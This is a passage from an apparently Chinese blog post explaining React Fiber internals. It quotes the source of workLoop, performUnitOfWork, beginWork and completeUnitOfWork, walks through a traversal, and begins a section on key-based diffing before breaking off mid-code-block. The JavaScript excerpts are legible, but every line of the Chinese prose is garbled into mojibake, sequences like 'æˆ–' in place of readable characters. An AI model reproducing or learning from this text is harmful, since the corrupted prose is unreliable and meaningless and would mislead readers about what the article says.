requestIdleCallback æˆ– messageChannel æ—¶é—´åˆ‡ç‰‡å®ç°ä¸­æ–­å’Œæ¢å¤ã€‚</li><li>æŒ‰éœ€éå†ï¼šé€šè¿‡ lanes å’Œ childLanes æ ‡è®° Fiber èŠ‚ç‚¹ä¼˜å…ˆçº§ï¼Œè·³è¿‡æ— éœ€æ›´æ–°çš„å­æ ‘ï¼Œæ—¶é—´å¤æ‚åº¦ä»é€’å½’çš„ O(n) ä¼˜åŒ–åˆ° O(m)</li><li>ä¼˜å…ˆçº§è°ƒåº¦ï¼šç»“åˆ Lane æ¨¡å‹åŠ¨æ€è°ƒæ•´éå†é¡ºåºï¼Œå®ç°é«˜ä¼˜å…ˆçº§ä»»åŠ¡ä¸­æ–­ä½ä¼˜å…ˆçº§ä»»åŠ¡</li><li>å†…å­˜å®‰å…¨ï¼šé“¾è¡¨éå†åœ¨å †å†…å­˜ä¸­è¿›è¡Œï¼Œä¸å—è°ƒç”¨æ ˆé™åˆ¶ï¼Œæ²¡æœ‰é€’å½’æ ˆå¸§ç´¯ç§¯ï¼Œå› æ­¤æ”¯æŒä»»æ„æ·±åº¦çš„ç»„ä»¶æ ‘</li></ol><h3 id="performUnitOfWorkæºç è§£æï¼ˆå«é…å›¾ï¼‰"><a href="#performUnitOfWorkæºç è§£æï¼ˆå«é…å›¾ï¼‰" class="headerlink" title="performUnitOfWorkæºç è§£æï¼ˆå«é…å›¾ï¼‰"></a>performUnitOfWorkæºç è§£æï¼ˆå«é…å›¾ï¼‰</h3><p>æˆ‘ä»¬é¦–å…ˆäº†è§£ä¸‹ Fiber æ¶æ„ä¸­çš„å·¥ä½œå¾ªç¯ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">/** <span class="hljs-doctag">@noinline</span> */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoopConcurrentByScheduler</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// Perform work until Scheduler asks us to yield</span><br>  <span class="hljs-keyword">while</span> (workInProgress !== <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-title function_">shouldYield</span>()) &#123;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-call] flow doesn&#x27;t know that shouldYield() is side-effect free</span><br>    <span class="hljs-title function_">performUnitOfWork</span>(workInProgress);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>performUnitOfWork æ˜¯ Fiber æ¶æ„ä¸­å·¥ä½œå¾ªç¯ï¼ˆ<code>workLoop</code>ï¼‰çš„æœ€å°æ‰§è¡Œå•å…ƒï¼Œæºç ä½ç½®è§<a href="https://github.com/facebook/react/blob/main/packages/react-reconciler/src/ReactFiberWorkLoop.js#L2779">è¿™é‡Œ</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">unitOfWork: Fiber</span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// The current, flushed, state of this fiber is the alternate. Ideally</span><br>  <span class="hljs-comment">// nothing should rely on this, but relying on it here means that we don&#x27;t</span><br>  <span class="hljs-comment">// need an additional field on the work in progress.</span><br>  <span class="hljs-keyword">const</span> current = unitOfWork.<span class="hljs-property">alternate</span>;<br><br>  <span class="hljs-keyword">let</span> next;<br>  <span class="hljs-keyword">if</span> (enableProfilerTimer &amp;&amp; (unitOfWork.<span class="hljs-property">mode</span> &amp; <span class="hljs-title class_">ProfileMode</span>) !== <span class="hljs-title class_">NoMode</span>) &#123;<br>    <span class="hljs-title function_">startProfilerTimer</span>(unitOfWork);<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      next = <span class="hljs-title function_">runWithFiberInDEV</span>(<br>        unitOfWork,<br>        beginWork,<br>        current,<br>        unitOfWork,<br>        entangledRenderLanes,<br>      );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      next = <span class="hljs-title function_">beginWork</span>(current, unitOfWork, entangledRenderLanes);<br>    &#125;<br>    <span class="hljs-title function_">stopProfilerTimerIfRunningAndRecordDuration</span>(unitOfWork);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      next = <span class="hljs-title function_">runWithFiberInDEV</span>(<br>        unitOfWork,<br>        beginWork,<br>        current,<br>        unitOfWork,<br>        entangledRenderLanes,<br>      );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      next = <span class="hljs-title function_">beginWork</span>(current, unitOfWork, entangledRenderLanes);<br>    &#125;<br>  &#125;<br><br>  unitOfWork.<span class="hljs-property">memoizedProps</span> = unitOfWork.<span class="hljs-property">pendingProps</span>;<br>  <span class="hljs-keyword">if</span> (next === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// If this doesn&#x27;t spawn new work, complete the current work.</span><br>    <span class="hljs-title function_">completeUnitOfWork</span>(unitOfWork);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    workInProgress = next;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼Œä¸»è¦æµç¨‹åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">unitOfWork: Fiber</span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// 1. å¼€å§‹å·¥ä½œé˜¶æ®µï¼ˆé€’ï¼‰</span><br>  <span class="hljs-keyword">const</span> current = unitOfWork.<span class="hljs-property">alternate</span>;<br>  <span class="hljs-keyword">let</span> next;<br>  next = <span class="hljs-title function_">beginWork</span>(current, unitOfWork, entangledRenderLanes);<br><br>  <span class="hljs-comment">// 2. å®Œæˆå·¥ä½œé˜¶æ®µï¼ˆå½’ï¼‰</span><br>  <span class="hljs-keyword">if</span> (next === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-title function_">completeUnitOfWork</span>(unitOfWork);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    workInProgress = next;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>beginWork - é€’é˜¶æ®µï¼šå¤„ç†ç»„ä»¶æ›´æ–°ï¼ˆprops&#x2F;state è®¡ç®—ã€diff ç­‰ï¼‰</strong></p><p>æ ¸å¿ƒä»£ç é€»è¾‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">beginWork</span>(<span class="hljs-params"></span><br><span class="hljs-params">  current: Fiber | <span class="hljs-literal">null</span>,</span><br><span class="hljs-params">  workInProgress: Fiber,</span><br><span class="hljs-params">  renderLanes: Lanes</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Fiber</span> | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦éœ€è¦è·³è¿‡æ›´æ–°ï¼ˆä¼˜åŒ–æ‰‹æ®µï¼‰</span><br>  <span class="hljs-keyword">if</span> (current !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">const</span> oldProps = current.<span class="hljs-property">memoizedProps</span>;<br>    <span class="hljs-keyword">const</span> newProps = workInProgress.<span class="hljs-property">pendingProps</span>;<br>    <br>    <span class="hljs-keyword">if</span> (oldProps === newProps &amp;&amp; !<span class="hljs-title function_">hasLegacyContextChanged</span>()) &#123;<br>      <span class="hljs-keyword">const</span> hasScheduledUpdateOrContext = <span class="hljs-title function_">checkScheduledUpdateOrContext</span>(<br>        current,<br>        renderLanes,<br>      );<br>      <span class="hljs-keyword">if</span> (<br>        !hasScheduledUpdateOrContext &amp;&amp;<br>        <span class="hljs-comment">// If this is the second pass of an error or suspense boundary, there</span><br>        <span class="hljs-comment">// may not be work scheduled on `current`, so we check for this flag.</span><br>        (workInProgress.<span class="hljs-property">flags</span> &amp; <span class="hljs-title class_">DidCapture</span>) === <span class="hljs-title class_">NoFlags</span><br>      ) &#123;<br>        <span class="hljs-comment">// No pending updates or context. Bail out now.</span><br>        didReceiveUpdate = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">attemptEarlyBailoutIfNoScheduledUpdate</span>(<br>          current,<br>          workInProgress,<br>          renderLanes,<br>        );<br>      &#125;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// æ ¹æ®ç»„ä»¶ç±»å‹æ‰§è¡Œä¸åŒå¤„ç†</span><br>  <span class="hljs-keyword">switch</span> (workInProgress.<span class="hljs-property">tag</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">FunctionComponent</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateFunctionComponent</span>(current, workInProgress, ...);<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ClassComponent</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateClassComponent</span>(current, workInProgress, ...);<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">HostComponent</span>: <span class="hljs-comment">// DOM èŠ‚ç‚¹</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateHostComponent</span>(current, workInProgress, ...);<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ScopeComponent</span>: &#123;<br>      <span class="hljs-keyword">if</span> (enableScopeAPI) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateScopeComponent</span>(current, workInProgress, renderLanes);<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">// ...å…¶ä»–ç±»å‹å¤„ç†</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒæ“ä½œï¼š</p><ul><li>ä¼˜å…ˆçº§è¿‡æ»¤ï¼šé€šè¿‡ renderLanes è·³è¿‡ä½ä¼˜å…ˆçº§ä»»åŠ¡</li><li>diff ç®—æ³•ï¼šåœ¨<code>reconcileChildren</code>ä¸­ç”Ÿæˆå­ Fiber</li><li>å‰¯ä½œç”¨æ ‡è®°ï¼šè®¾ç½® effectTag</li></ul><p><strong>completeUnitOfWork - å½’é˜¶æ®µï¼šå®Œæˆ DOM å‡†å¤‡ã€æ”¶é›†å‰¯ä½œç”¨</strong></p><p>æ ¸å¿ƒä»£ç é€»è¾‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">completeUnitOfWork</span>(<span class="hljs-params">unitOfWork: Fiber</span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// Attempt to complete the current unit of work, then move to the next</span><br>  <span class="hljs-comment">// sibling. If there are no more siblings, return to the parent fiber.</span><br>  <span class="hljs-keyword">let</span> <span class="hljs-attr">completedWork</span>: <span class="hljs-title class_">Fiber</span> = unitOfWork;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> ((completedWork.<span class="hljs-property">flags</span> &amp; <span class="hljs-title class_">Incomplete</span>) !== <span class="hljs-title class_">NoFlags</span>) &#123;<br>      <span class="hljs-comment">// This fiber did not complete, because one of its children did not</span><br>      <span class="hljs-comment">// complete. Switch to unwinding the stack instead of completing it.</span><br>      <span class="hljs-comment">//</span><br>      <span class="hljs-comment">// The reason &quot;unwind&quot; and &quot;complete&quot; is interleaved is because when</span><br>      <span class="hljs-comment">// something suspends, we continue rendering the siblings even though</span><br>      <span class="hljs-comment">// they will be replaced by a fallback.</span><br>      <span class="hljs-keyword">const</span> skipSiblings = workInProgressRootDidSkipSuspendedSiblings;<br>      <span class="hljs-title function_">unwindUnitOfWork</span>(completedWork, skipSiblings);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// The current, flushed, state of this fiber is the alternate. Ideally</span><br>    <span class="hljs-comment">// nothing should rely on this, but relying on it here means that we don&#x27;t</span><br>    <span class="hljs-comment">// need an additional field on the work in progress.</span><br>    <span class="hljs-keyword">const</span> current = completedWork.<span class="hljs-property">alternate</span>;<br>    <span class="hljs-keyword">const</span> returnFiber = completedWork.<span class="hljs-property">return</span>;<br><br>    <span class="hljs-keyword">let</span> next;<br>    <span class="hljs-title function_">startProfilerTimer</span>(completedWork);<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      next = <span class="hljs-title function_">runWithFiberInDEV</span>(<br>        completedWork,<br>        completeWork,<br>        current,<br>        completedWork,<br>        entangledRenderLanes,<br>      );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      next = <span class="hljs-title function_">completeWork</span>(current, completedWork, entangledRenderLanes);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (enableProfilerTimer &amp;&amp; (completedWork.<span class="hljs-property">mode</span> &amp; <span class="hljs-title class_">ProfileMode</span>) !== <span class="hljs-title class_">NoMode</span>) &#123;<br>      <span class="hljs-comment">// Update render duration assuming we didn&#x27;t error.</span><br>      <span class="hljs-title function_">stopProfilerTimerIfRunningAndRecordIncompleteDuration</span>(completedWork);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (next !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// Completing this fiber spawned new work. Work on that next.</span><br>      workInProgress = next;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> siblingFiber = completedWork.<span class="hljs-property">sibling</span>;<br>    <span class="hljs-keyword">if</span> (siblingFiber !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// If there is more work to do in this returnFiber, do that next.</span><br>      workInProgress = siblingFiber;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// Otherwise, return to the parent</span><br>    <span class="hljs-comment">// $FlowFixMe[incompatible-type] we bail out when we get a null</span><br>    completedWork = returnFiber;<br>    <span class="hljs-comment">// Update the next thing we&#x27;re working on in case something throws.</span><br>    workInProgress = completedWork;<br>  &#125; <span class="hljs-keyword">while</span> (completedWork !== <span class="hljs-literal">null</span>);<br><br>  <span class="hljs-comment">// We&#x27;ve reached the root.</span><br>  <span class="hljs-keyword">if</span> (workInProgressRootExitStatus === <span class="hljs-title class_">RootInProgress</span>) &#123;<br>    workInProgressRootExitStatus = <span class="hljs-title class_">RootCompleted</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒæ“ä½œï¼š</p><ul><li>DOM å‡†å¤‡ï¼šåœ¨ completeWork ä¸­åˆ›å»º&#x2F;æ›´æ–° DOM</li><li>å‰¯ä½œç”¨æ”¶é›†ï¼šé€šè¿‡ firstEffect&#x2F;lastEffectæ„å»ºçº¿æ€§å‰¯ä½œç”¨é“¾è¡¨ï¼Œä¾›æäº¤é˜¶æ®µæ‰¹é‡å¤„ç†</li><li>å›æº¯æœºåˆ¶ï¼šé€šè¿‡ return æŒ‡é’ˆå®ç°éé€’å½’éå†</li></ul><p><strong>éå†è¿‡ç¨‹å›¾è§£</strong></p><p>è¿˜æ˜¯ä»¥ä¹‹å‰çš„ç»„ä»¶æ ‘ä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;App&gt;<br>  &lt;Header /&gt;<br>  &lt;Content&gt;<br>    &lt;Sidebar /&gt;<br>    &lt;Main /&gt;<br>  &lt;/Content&gt;<br>&lt;/App&gt;<br></code></pre></td></tr></table></figure><p>å…¶é“¾è¡¨éå†é¡ºåºå›¾ï¼š</p><pre class="mermaid">graph LR    A[App] --> B[Header]    B --> C[Content]    C --> D[Sidebar]    D --> E[Main]    E --> F[å›æº¯Content]    F --> G[å›æº¯App]</pre><p>å…·ä½“æ­¥éª¤ï¼š</p><ol><li>performUnitOfWork(App) -&gt; beginWork(App) -&gt; è¿”å›å­èŠ‚ç‚¹ Header -&gt; workInProgress &#x3D; Header</li><li>workLoopSync -&gt; performUnitOfWork(Header) -&gt; beginWork(Header) -&gt; æ— å­èŠ‚ç‚¹ï¼Œè¿”å›null</li><li>completeUnitOfWork(Header) -&gt; workInProgress &#x3D; Header.siblingFiber(å³Content)</li><li>performUnitOfWork(Content) -&gt; beginWork(Content) -&gt; è¿”å›å­èŠ‚ç‚¹ Sidebar -&gt; workInProgress &#x3D; Sidebar</li><li>workLoopSync -&gt; performUnitOfWork(Sidebar) -&gt; beginWork(Sidebar) -&gt; æ— å­èŠ‚ç‚¹ï¼Œè¿”å›null</li><li>completeUnitOfWork(Sidebar) -&gt; workInProgress &#x3D; Sidebar.siblingFiber(å³Main)</li><li>performUnitOfWork(Main) -&gt; beginWork(Main) -&gt; æ— å­èŠ‚ç‚¹æ— å…„å¼ŸèŠ‚ç‚¹ï¼Œè¿”å› null</li><li>completeUnitOfWork(Main) -&gt; æ— å­èŠ‚ç‚¹ï¼Œæ— å…„å¼ŸèŠ‚ç‚¹ -&gt; return å›æº¯åˆ° Content -&gt; æ— å…„å¼ŸèŠ‚ç‚¹ -&gt; completeUnitOfWork(Content) -&gt; return å›æº¯åˆ° App -&gt; éå†ç»“æŸ</li></ol><p><strong>performUnitOfWork çš„å®Œæ•´å·¥ä½œæµç¨‹</strong></p><pre class="mermaid">sequenceDiagram    participant Scheduler    participant performUnitOfWork    participant beginWork    participant completeUnitOfWork    Scheduler->>performUnitOfWork: åˆ†é…ä»»åŠ¡ï¼ˆFiberèŠ‚ç‚¹ï¼‰    performUnitOfWork->>beginWork: å¤„ç†å½“å‰èŠ‚ç‚¹    alt æœ‰å­èŠ‚ç‚¹        beginWork-->>performUnitOfWork: è¿”å›å­èŠ‚ç‚¹    else æ— å­èŠ‚ç‚¹        beginWork-->>performUnitOfWork: null        performUnitOfWork->>completeUnitOfWork: è¿›å…¥å®Œæˆé˜¶æ®µ        completeUnitOfWork-->>performUnitOfWork: è¿”å›å…„å¼Ÿ/çˆ¶èŠ‚ç‚¹    end    performUnitOfWork-->>Scheduler: è¿”å›ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</pre><h2 id="3-3-Diffç®—æ³•çš„FiberåŒ–æ”¹é€ "><a href="#3-3-Diffç®—æ³•çš„FiberåŒ–æ”¹é€ " class="headerlink" title="3.3 Diffç®—æ³•çš„FiberåŒ–æ”¹é€ "></a>3.3 Diffç®—æ³•çš„FiberåŒ–æ”¹é€ </h2><h3 id="åŒçº§æ¯”è¾ƒï¼ˆKeyä¼˜åŒ–ï¼‰åœ¨Fiberä¸­çš„å®ç°"><a href="#åŒçº§æ¯”è¾ƒï¼ˆKeyä¼˜åŒ–ï¼‰åœ¨Fiberä¸­çš„å®ç°" class="headerlink" title="åŒçº§æ¯”è¾ƒï¼ˆKeyä¼˜åŒ–ï¼‰åœ¨Fiberä¸­çš„å®ç°"></a>åŒçº§æ¯”è¾ƒï¼ˆKeyä¼˜åŒ–ï¼‰åœ¨Fiberä¸­çš„å®ç°</h3><p>React åˆ—è¡¨å…ƒç´ ä¸ºä»€ä¹ˆè¦åŠ ä¸Š key å±æ€§ï¼Ÿ</p><p>æ— è®ºæ˜¯ä¼ ç»Ÿ Diff è¿˜æ˜¯ Fiber Diffï¼Œkey çš„æ ¸å¿ƒä½œç”¨éƒ½æ˜¯<code>å”¯ä¸€æ ‡è¯†åŒçº§å…ƒç´ </code>ã€‚ä¼ ç»Ÿè™šæ‹Ÿ DOM Diff åœ¨ key çš„åˆ©ç”¨ä¸Šæœ‰ä¸¤ä¸ªç“¶é¢ˆï¼š</p><p><strong>åŒæŒ‡é’ˆéå†ç®—æ³•ï¼ˆO(nÂ²) å¤æ‚åº¦ï¼‰</strong></p><p>ä¼ ç»Ÿ Diff é€šè¿‡ä¸¤å±‚å¾ªç¯åŒ¹é…æ–°æ—§èŠ‚ç‚¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i =<span class="hljs-number">0</span>; i &lt; newChildren.<span class="hljs-property">length</span>; i++) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j =<span class="hljs-number">0</span>; j &lt; oldChildren.<span class="hljs-property">length</span>; j++) &#123;<br>    <span class="hljs-keyword">if</span> (newChild[i].<span class="hljs-property">key</span> === oldChild[j].<span class="hljs-property">key</span>) &#123;<br>      <span class="hljs-comment">// åŒ¹é…æˆåŠŸï¼Œå¤ç”¨èŠ‚ç‚¹</span><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™å¸¦æ¥çš„é—®é¢˜æ˜¯ï¼š</p><ul><li>é•¿åº¦ä¸º n çš„åˆ—è¡¨æœ€åæƒ…å†µä¸‹éœ€è¦ nÂ² æ¬¡æ¯”è¾ƒï¼Œæ€§èƒ½éšåˆ—è¡¨é•¿åº¦å¢å¤§æ€¥å‰§ä¸‹é™</li><li>ä»…èƒ½é€šè¿‡ä½ç½®ç´¢å¼•çŒœæµ‹èŠ‚ç‚¹ç§»åŠ¨ï¼Œå®¹æ˜“äº§ç”Ÿå†—ä½™ DOM æ“ä½œ</li></ul><p><strong>å¤ç”¨ç²’åº¦æœ‰é™</strong></p><ul><li>ä»…èƒ½å¤ç”¨è™šæ‹Ÿ DOM èŠ‚ç‚¹å¯¹è±¡ï¼Œä»éœ€æ‰§è¡Œç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸå’Œ DOM å±æ€§å¯¹æ¯”</li><li>æ— æ³•è·³è¿‡çŠ¶æ€æœªå‘ç”Ÿæ”¹å˜çš„ç»„ä»¶æ¸²æŸ“ï¼ˆæ¯”å¦‚ shouldComponentUpdate éœ€æ‰‹åŠ¨ä¼˜åŒ–ï¼‰</li></ul><p>Fiber æ¶æ„å¯¹æ¯”ä¼ ç»Ÿè™šæ‹Ÿ DOM Diff åœ¨ key çš„åˆ©ç”¨ä¸Šå®ç°äº†è´¨çš„é£è·ƒã€‚</p><p>åœ¨ Fiber æ¶æ„ä¸­ï¼ŒåŒçº§æ¯”è¾ƒçš„æ ¸å¿ƒé€»è¾‘é›†ä¸­åœ¨ <code>reconcileChildren</code> å‡½æ•°ä¸­ï¼Œå®ƒè´Ÿè´£å¯¹æ¯”æ–°æ—§å­èŠ‚ç‚¹å¹¶ç”Ÿæˆæ–°çš„ Fiber æ ‘ã€‚beginWork å‡½æ•°æ ¹æ®ç»„ä»¶ç±»å‹æ‰§è¡Œå¯¹åº”å¤„ç†æ—¶è§¦å‘è¯¥å‡½æ•°ã€‚</p><p><strong>å…¥å£å‡½æ•°ï¼šreconcileChildren</strong></p><p>æ ¹æ®å½“å‰æ˜¯é¦–æ¬¡æ¸²æŸ“è¿˜æ˜¯æ›´æ–°è°ƒç”¨ mountChildFibers æˆ– reconcileChildFibers</p><ul><li>mountChildFibersï¼š</li><li>reconcileChildFibersï¼šå¤„ç†å­èŠ‚ç‚¹åè°ƒçš„æ ¸å¿ƒé€»è¾‘ï¼Œæ ¹æ®å­èŠ‚ç‚¹ç±»å‹åšä¸åŒå¤„ç†ï¼Œæ¯”å¦‚å­èŠ‚ç‚¹ä¸ºæ•°ç»„æ—¶è°ƒç”¨ <code>reconcileChildrenArray</code> å‡½æ•°å¤„ç†ã€‚</li></ul><p><strong>æ ¸å¿ƒä¼˜åŒ–é€»è¾‘</strong></p><p>reconcileChildrenArray é‡‡ç”¨å¤šé˜¶æ®µéå† + key æ˜ å°„è¡¨çš„ç­–ç•¥ï¼Œå°†æ—¶é—´å¤æ‚åº¦ä¼˜åŒ–è‡³O(n)ï¼Œä¸»è¦ä¼˜åŒ–åŒ…æ‹¬:</p><ul><li>ä¸¤è½®éå†ï¼šå…ˆå°è¯•ä»å·¦åˆ°å³é¡ºåºåŒ¹é…ï¼Œå†å¤„ç†ç§»åŠ¨&#x2F;æ–°å¢&#x2F;åˆ é™¤</li><li>key æ˜ å°„ï¼šå‰©ä½™æœªåŒ¹é…çš„æ—§èŠ‚ç‚¹å­˜å…¥mapï¼Œå®ç°O(1)æŸ¥æ‰¾</li><li>èŠ‚ç‚¹å¤ç”¨ï¼šé€šè¿‡ key å’Œ type ç²¾ç¡®åŒ¹é…å¯å¤ç”¨çš„ Fiber èŠ‚ç‚¹</li><li>æœ€å°åŒ– DOM æ“ä½œï¼šä»…æ ‡è®°éœ€è¦ç§»åŠ¨å’Œåˆ é™¤çš„èŠ‚ç‚¹</li></ul><p><strong>æºç è§£æï¼šä»¥ reconcileChildrenArray ä¸ºä¾‹</strong></p><p>é˜¶æ®µä¸€ï¼šé¡ºåºéå†åŒ¹é…ï¼ˆä»å·¦åˆ°å³ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 